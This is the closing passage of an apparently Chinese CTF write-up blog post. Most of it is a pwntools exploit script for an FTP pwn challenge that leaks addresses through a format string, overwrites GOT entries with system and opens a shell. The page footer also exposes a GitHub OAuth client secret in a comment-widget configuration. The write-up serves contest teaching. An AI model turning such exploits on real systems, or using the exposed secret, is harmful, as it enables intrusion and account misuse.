&quot;</span>)</span><br><span class="line">p.send(<span class="string">b&#x27;test&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Password: &quot;</span>)</span><br><span class="line"></span><br><span class="line">p.send(<span class="string">b&#x27;r&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;/No)&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">b&#x27;No%25$p&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;0x&quot;</span>)</span><br><span class="line">addr = <span class="built_in">int</span>(p.recv(<span class="number">12</span>),<span class="number">16</span>)+<span class="number">0x2e2b</span></span><br><span class="line">success(<span class="string">&quot;addr :&quot;</span>+<span class="built_in">hex</span>(addr))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">touch</span>(<span class="params">content,content1</span>):</span><br><span class="line">    p.recvuntil(<span class="string">&quot;FTP&gt; &quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&#x27;touch\x01&#x27;</span>+content)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;text:&quot;</span>)</span><br><span class="line">    p.send(content1)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cat</span>():</span><br><span class="line">    p.recvuntil(<span class="string">&quot;FTP&gt; &quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&#x27;cat&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug0</span>():</span><br><span class="line">    p.recvuntil(<span class="string">&quot;FTP&gt; &quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,content</span>):</span><br><span class="line">    p.recvuntil(<span class="string">&quot;FTP&gt; &quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&#x27;edit&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;idx:&quot;</span>)</span><br><span class="line">    p.send(<span class="built_in">str</span>(index))</span><br><span class="line">    p.recvuntil(<span class="string">&quot;nt: &quot;</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    p.recvuntil(<span class="string">&quot;FTP&gt; &quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&#x27;del&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;idx:&quot;</span>)</span><br><span class="line">    p.send(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ls</span>():</span><br><span class="line">    p.recvuntil(<span class="string">&quot;FTP&gt; &quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&#x27;ls&#x27;</span>)</span><br><span class="line"></span><br><span class="line">touch(p64(addr+<span class="number">0x38</span>),<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">free_got = addr-<span class="number">0xae8</span></span><br><span class="line">touch(p64(free_got),<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">touch(<span class="string">b&#x27;1&#x27;</span>,<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">touch(<span class="string">b&#x27;1&#x27;</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">touch(<span class="string">b&#x27;1&#x27;</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">strlen_got = addr - <span class="number">0xad0</span></span><br><span class="line">edit(-<span class="number">16</span>,p64(strlen_got))</span><br><span class="line">cat()</span><br><span class="line">libc_addr = u64(p.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">system_addr = addr-<span class="number">0x3940</span></span><br><span class="line">edit(-<span class="number">15</span>,p64(system_addr))</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="写在最后"><a class="markdownIt-Anchor" href="#写在最后"></a> 写在最后</h2>
<p>能够看完或者看到这篇Writeup，对我来说这是一个很幸福的事儿。虽然比赛过程坎坷，却又让我找回来最开始打CTF时的乐趣，这种不长不短的时间，不多不少的赛题量，很适合用来缓冲缓冲现在浮躁的CTF圈子。</p>

    </div>

    
    
    

    <footer class="post-footer">
          <div class="post-tags">
              <a href="/tags/Web/" rel="tag"># Web</a>
              <a href="/tags/Misc/" rel="tag"># Misc</a>
              <a href="/tags/Crypto/" rel="tag"># Crypto</a>
              <a href="/tags/Reverse/" rel="tag"># Reverse</a>
              <a href="/tags/Pwn/" rel="tag"># Pwn</a>
              <a href="/tags/Writeup/" rel="tag"># Writeup</a>
          </div>

        

          <div class="post-nav">
            <div class="post-nav-item">
                <a href="/2023/05/Docker%E4%B8%8EK8S%E5%AD%A6%E4%B9%A0-1%E5%AE%89%E8%A3%85%E5%92%8C%E9%85%8D%E7%BD%AE/" rel="prev" title="Docker与K8S学习-1安装和配置">
                  <i class="fa fa-chevron-left"></i> Docker与K8S学习-1安装和配置
                </a>
            </div>
            <div class="post-nav-item">
                <a href="/2023/05/CISCN2023%E5%88%9D%E8%B5%9B-Writeup-1/" rel="next" title="CISCN初赛-Writeup">
                  CISCN初赛-Writeup <i class="fa fa-chevron-right"></i>
                </a>
            </div>
          </div>
    </footer>
  </article>
</div>






</div>
  </main>

  <footer class="footer">
    <div class="footer-inner">


<script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>

<div class="copyright">
  &copy; 
  <span itemprop="copyrightYear">2023</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">TWe1v3</span>
</div>
<div class="wordcount">
  <span class="post-meta-item">
    <span class="post-meta-item-icon">
      <i class="fa fa-chart-line"></i>
    </span>
      <span>站点总字数：</span>
    <span title="站点总字数">293k</span>
  </span>
  <span class="post-meta-item">
    <span class="post-meta-item-icon">
      <i class="fa fa-coffee"></i>
    </span>
      <span>站点阅读时长 &asymp;</span>
    <span title="站点阅读时长">4:26</span>
  </span>
</div>

<div class="powered-by">
<i class="fa fa-user-md"></i><span id="busuanzi_container_site_uv">
  本站访客数:<span id="busuanzi_value_site_uv"></span>
</span>
</div>

    </div>
  </footer>


  
  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script>

  
<script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.0/search.js" integrity="sha256-vXZMYLEqsROAXkEw93GGIvaB2ab+QW6w3+1ahD9nXXA=" crossorigin="anonymous"></script>
<script src="/js/third-party/search/local-search.js"></script>


  <script class="next-config" data-name="mermaid" type="application/json">{"enable":true,"theme":{"light":"default","dark":"dark"},"js":{"url":"https://cdnjs.cloudflare.com/ajax/libs/mermaid/9.1.3/mermaid.min.js","integrity":"sha256-TIYL00Rhw/8WaoUhYTLX9SKIEFdXxg+yMWSLVUbhiLg="}}</script>
  <script src="/js/third-party/tags/mermaid.js"></script>



  




  

  <script class="next-config" data-name="enableMath" type="application/json">false</script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.16.0/katex.min.css" integrity="sha256-uik/hNqHWZldXh/0K35nqOSCff9F61/ZOFReqNOBgB0=" crossorigin="anonymous">
  <script class="next-config" data-name="katex" type="application/json">{"copy_tex_js":{"url":"https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.16.0/contrib/copy-tex.min.js","integrity":"sha256-Us54+rSGDSTvIhKKUs4kygE2ipA0RXpWWh0/zLqw3bs="}}</script>
  <script src="/js/third-party/math/katex.js"></script>


<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/gitalk/1.7.2/gitalk.css" integrity="sha256-AJnUHL7dBv6PGaeyPQJcgQPDjt/Hn/PvYZde1iqfp8U=" crossorigin="anonymous">

<script class="next-config" data-name="gitalk" type="application/json">{"enable":true,"github_id":"TWe1v3# GitHub repo owner","repo":"TWe1v3-Blogcomment","client_id":"b1f12cb0fd210a7f001b# GitHub Application Client ID","client_secret":"80355aa1b174d1926079780262cdc80f1ca96516","admin_user":"TWe1v3","distraction_free_mode":true,"proxy":"https://cors-anywhere.azm.workers.dev/https://github.com/login/oauth/access_token","language":"zh-CN","js":{"url":"https://cdnjs.cloudflare.com/ajax/libs/gitalk/1.7.2/gitalk.min.js","integrity":"sha256-Pmj85ojLaPOWwRtlMJwmezB/Qg8BzvJp5eTzvXaYAfA="},"path_md5":"e606e8eaafa8f05224b28c6c64a05b32"}</script>
<script src="/js/third-party/comments/gitalk.js"></script>


<script src="/live2d-widget/autoload.js"></script>
</body>
</html>
